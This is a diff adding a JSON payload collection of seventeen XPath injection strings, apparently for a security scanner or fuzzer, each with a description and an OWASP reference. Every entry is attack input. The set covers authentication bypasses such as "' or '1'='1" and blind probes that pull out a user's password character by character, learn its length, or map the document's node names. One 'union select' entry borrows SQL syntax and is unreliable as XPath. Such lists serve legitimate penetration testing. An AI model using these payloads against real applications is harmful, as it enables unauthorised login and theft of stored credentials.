@@ -1,0 +1,132 @@
+[
+  {
+    "id": "xpath-001",
+    "family": "xpath",
+    "subtype": "basic",
+    "payload_string": "' or '1'='1",
+    "context": "string",
+    "description": "Basic XPath injection for authentication bypass",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xpath-002",
+    "family": "xpath",
+    "subtype": "basic",
+    "payload_string": "' or ''='",
+    "context": "string",
+    "description": "XPath injection with empty string comparison",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xpath-003",
+    "family": "xpath",
+    "subtype": "blind",
+    "payload_string": "' and substring(string(/users/user[1]/password),1,1)='a",
+    "context": "string",
+    "description": "Blind XPath injection for character extraction",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xpath-004",
+    "family": "xpath",
+    "subtype": "blind",
+    "payload_string": "' and string-length(string(/users/user[1]/password))=8 and '1'='1",
+    "context": "string",
+    "description": "Blind XPath injection to determine password length",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xpath-005",
+    "family": "xpath",
+    "subtype": "union",
+    "payload_string": "' union select 'admin'--",
+    "context": "string",
+    "description": "XPath injection union-style data extraction",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xpath-006",
+    "family": "xpath",
+    "subtype": "basic",
+    "payload_string": "][)]}{'1'='1",
+    "context": "string",
+    "description": "XPath injection with bracket/brace manipulation",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xpath-007",
+    "family": "xpath",
+    "subtype": "basic",
+    "payload_string": "admin' or '1'='1'/*",
+    "context": "string",
+    "description": "XPath injection with comment bypass",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xpath-008", "family": "xpath", "subtype": "blind",
+    "payload_string": "' and count(/*)=1 and '1'='1", "context": "string",
+    "description": "Blind XPath - count root nodes",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xpath-009", "family": "xpath", "subtype": "blind",
+    "payload_string": "' and name(/*[1])='users' and '1'='1", "context": "string",
+    "description": "Blind XPath - infer root node name",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xpath-010", "family": "xpath", "subtype": "blind",
+    "payload_string": "' and substring(name(/*[1]),1,1)='a", "context": "string",
+    "description": "Blind XPath - infer root node name character",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xpath-011", "family": "xpath", "subtype": "blind",
+    "payload_string": "' and substring(name(/*[1]),1,1)='u", "context": "string",
+    "description": "Blind XPath - infer root node name character (u)",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xpath-012", "family": "xpath", "subtype": "blind",
+    "payload_string": "1 and count(/child::node())=1", "context": "string",
+    "description": "Blind XPath - count children",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xpath-013", "family": "xpath", "subtype": "blind",
+    "payload_string": "' and count(//*[string-length(name())=4])>0 and '1'='1", "context": "string",
+    "description": "Blind XPath - elements with 4 character names",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xpath-014", "family": "xpath", "subtype": "blind",
+    "payload_string": "1 or count(parent::*[position()=1])=0", "context": "string",
+    "description": "Blind XPath - verify root context",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xpath-015", "family": "xpath", "subtype": "blind",
+    "payload_string": "1 or string-length(name(.))=0", "context": "string",
+    "description": "Blind XPath - name length is zero (document root)",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xpath-016", "family": "xpath", "subtype": "blind",
+    "payload_string": "1 and string-length(//user[position()=1]/password)>0", "context": "string",
+    "description": "Blind XPath - verify specific node existence",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xpath-017", "family": "xpath", "subtype": "blind",
+    "payload_string": "' and (count(//*[string-length(name())>0]) > 1000) and '1'='1", "context": "string",
+    "description": "Blind XPath - heavy query for timing",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XPath_Injection"], "platform_specific": {}
+  }
+]
